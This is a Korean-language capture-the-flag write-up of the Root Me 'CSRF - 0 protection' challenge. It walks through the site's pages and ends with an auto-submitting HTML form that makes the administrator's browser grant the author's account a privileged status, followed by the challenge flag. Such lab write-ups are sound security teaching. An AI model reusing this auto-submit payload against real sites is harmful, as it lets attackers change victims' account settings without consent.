<!DOCTYPE html>
<html>
<head>
    <link rel="stylesheet" type="text/css" href="style.css">
</head>
<body>
    <h1> Root Me "CSRF - 0 protection"  Write-UP</h1>
</body>
<br>
<br>
</html>

2024.09.22 풀이

![image](https://github.com/user-attachments/assets/ff72fece-fcd7-4292-8d57-d71e52fc5325)

![image](https://github.com/user-attachments/assets/f5408461-31be-4b4b-9586-1124c89d6f7c)

우선 서버에 들어가보았다. 로그인하는 창과 회원가입하는 창이 보였다. 

<br>

</br>

![image](https://github.com/user-attachments/assets/e3147dd8-9641-4fee-b9d2-f73a7d5e1fb3)

![image](https://github.com/user-attachments/assets/749eb9e5-5da9-4bb6-8c0d-227820c2fdec)

일단 임의로 회원가입을 해보았다. 회원가입이 성공되었고, 로그인하라는 문구가 떴다. 관리자가 모든 권한을 허용하도록 내 상태를 업데이트할 것이라는 내용도 포함되어 있다. 

<br>

</br>

![image](https://github.com/user-attachments/assets/48ed5199-9f21-4950-9840-7c5449a89341)

![image](https://github.com/user-attachments/assets/4181fd6f-d730-4b6b-9f84-b09cd2864bc3)

회원가입을 하니, 프로필로 들어와졌다. 

<br>

</br>

## Profile 페이지

![image](https://github.com/user-attachments/assets/a8f15396-de06-4b46-8438-21fc30405d6c)

저기 Status 옆에 네모 칸을 체크되도록 하고 싶었는데, 눌리지 않았다. 

안 눌린 상태로 누르니, 

나는 관리자가 아니라고 실행되지 않는 것을 확인할 수 있다.

 <br>

</br>

## Private 페이지

![image](https://github.com/user-attachments/assets/496ecc33-bae7-44a9-badc-996a992ea0f8)

여기에는 내 계정이 아직 관리자에게 승인되지 않았다고 뜬다. 

 <br>

</br>

## Contact 페이지

![image](https://github.com/user-attachments/assets/6871beb9-2847-45c4-b54c-977c407370c5)

여기는 내 이메일 주소와 첨부할 내용을 작성해서 제출하는 것 같다. 

 

회원가입하고, 관리자가 내 접근 권한을 업데이트해줄거라고 하였었다. 근데, Status 칸이 눌리지 않기 때문에, 이 부분을 손 보면 플래그를 얻을 수 있을 것 같다고 생각했다. 
 <br>

</br>

![image](https://github.com/user-attachments/assets/b28e7927-4da6-4316-b933-feb18ebf707d)

개발자 도구로 Profile 부분에 username과 status가 들어있는 form 부분을 살펴보았다. 저 부분을 따와서

```
<form action="http://challenge01.root-me.org/web-client/ch22/?action=profile" method="post" enctype="multipart/form-data" id="blu">

<input type="text" name="username" value="blu">

<input type="checkbox" name="status" checked>

</form>

<script>javascript:document.getElementById("blu").submit();</script>
```
 <br>

</br>

맨 처음엔 헤더부분에 url에는 profile 페이지의 full url 을 입력하였고, 내 계정의 Status가 checked 되도록 작성하였다. 그리고, form의 submit을 자동으로 바로 실행되게 해주는 javascript:document.getElementById()를 사용하였다. 

이걸 Contact 페이지에 입력해보니, 

![image](https://github.com/user-attachments/assets/38b8d357-693a-470b-9f2f-2081aa0f09b0)

![image](https://github.com/user-attachments/assets/023c5b1a-d5f5-4a63-b81c-b57bd9e671a6)

내 메시지가 보내졌다는 문구가 뜬다. 

![image](https://github.com/user-attachments/assets/5e43eccd-eedd-4109-b21e-bac2c2a405d7)

그리고 Private 페이지를 확인해보니 플래그 값이 출력되었다!
<br>

</br>

```
Csrf_Fr33style-L3v3l1!
```
<br>

</br>

![image](https://github.com/user-attachments/assets/74ae125d-35d5-4698-bf27-83d335b207be)
